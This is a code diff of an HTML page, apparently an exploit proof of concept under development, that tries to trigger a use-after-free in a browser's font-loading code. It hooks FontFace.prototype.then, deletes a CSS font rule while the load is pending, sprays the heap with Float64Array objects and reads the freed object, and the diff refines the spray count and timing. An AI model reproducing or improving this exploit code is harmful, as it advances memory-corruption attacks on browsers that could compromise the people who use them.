@@ -3,77 +3,66 @@
 <head>
     <style>
         body { background: #000; color: #0f0; font-family: 'Courier New', monospace; padding: 20px; }
-        #console { border: 1px solid #333; padding: 10px; height: 400px; overflow-y: scroll; background: #0a0a0a; }
-        .log { margin-bottom: 5px; }
+        #console { border: 1px solid #333; padding: 10px; height: 500px; overflow-y: scroll; background: #0a0a0a; }
+        .log { margin-bottom: 5px; font-size: 12px; }
     </style>
 </head>
 <body>
-    <h3>JANUS_KERNEL_DEBUGGER v1.1 - [Partition Breaker]</h3>
+    <h3>JANUS_KERNEL_DEBUGGER v1.2 [FORCE_TRIGGER]</h3>
     <div id="console"></div>
+    <style id="s">@font-face { font-family: 'targetFont'; src: url(nonexistent.woff); unicode-range: U+0042; }</style>
 
     <script>
         const log = (msg) => {
             const consoleDiv = document.getElementById('console');
-            consoleDiv.innerHTML += `<div class="log">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
+            consoleDiv.innerHTML += `<div class="log">[LOG] ${msg}</div>`;
             consoleDiv.scrollTop = consoleDiv.scrollHeight;
         };
 
         window.onload = () => {
-    // 1. تثبيت الـ Hook أولاً (يجب أن يكون قبل أي محاولة تحميل)
-    let A = new FontFace('nonExistentFont_999', 'url(https://invalid-url.local)', { unicodeRange: 'U+0041' });
-    
-    Object.defineProperty(FontFace.prototype, 'then', {
-        configurable: true,
-        get() {
-            if (this === A) {
-                log("[!] HOOK_TRIGGERED: FontFace Promise Resolution intercepted...");
-                document.getElementById('s').sheet.deleteRule(0);
-                // هنا يبدأ الـ Spraying
-                return undefined;
-            }
-            return undefined;
-        }
-    });
-
-    document.fonts.add(A);
-    log("[+] FORCING_FONT_LOAD_PENDING...");
-    document.fonts.load('1em nonExistentFont_999', 'AB');
-};
-
-
+            log("INIT: Setting up memory traps...");
+            
+            // متغيرات عالمية لمنع التنظيف
+            window.spray = [];
+            let A = new FontFace('targetFont', 'url(https://invalid.url)', { unicodeRange: 'U+0041' });
+            
             Object.defineProperty(FontFace.prototype, 'then', {
                 configurable: true,
                 get() {
                     if (this === A) {
-                        log("<span style='color: yellow;'>[!] TRIGGER: Deleting FontRule...</span>");
-                        document.getElementById('s').sheet.deleteRule(0);
+                        log("!!! HOOK_SUCCESS: Promise caught !!!");
                         
-                        log("[+] SPRAYING_JSC_OBJECTS (Float64Array)...");
-                        let spray = [];
-                        for (let i = 0; i < 500; i++) {
-                            // تخصيص ذاكرة داخل مسبح الـ JSC
-                            let arr = new Float64Array(32); 
-                            arr[0] = 1.1; // بصمة رقمية للتداخل
-                            spray.push(arr);
+                        // تنفيذ التحرير
+                        document.getElementById('s').sheet.deleteRule(0);
+                        log("--- Rule deleted. Starting Heap Spray ---");
+                        
+                        // الضخ المباشر باستخدام Float64Array
+                        for (let i = 0; i < 1000; i++) {
+                            let arr = new Float64Array(32);
+                            arr[0] = 0.123456789; 
+                            window.spray.push(arr);
                         }
-
+                        log("--- Spray complete. Checking stability ---");
+                        
                         setTimeout(() => {
                             try {
-                                log("[?] ATTEMPTING_DEREFERENCE...");
-                                // محاولة القراءة من الكائن المحرر
-                                let val = A.family; 
-                                log("[SUCCESS] READ: " + val);
+                                let val = A.family;
+                                log("READ_VALUE: " + val);
                             } catch(e) {
-                                log("<span style='color: red;'>[CRITICAL] READ_FAILURE: " + e.message + "</span>");
+                                log("ERROR: " + e.message);
                             }
-                        }, 50);
+                        }, 500);
+                        
+                        return undefined;
                     }
                     return undefined;
                 }
             });
+
+            document.fonts.add(A);
+            log("Triggering font load...");
             document.fonts.load('1em targetFont', 'AB');
         };
     </script>
-    <style id="s">@font-face { font-family: 'targetFont'; src: url(nonexistent.woff); unicode-range: U+0042; }</style>
 </body>
 </html>
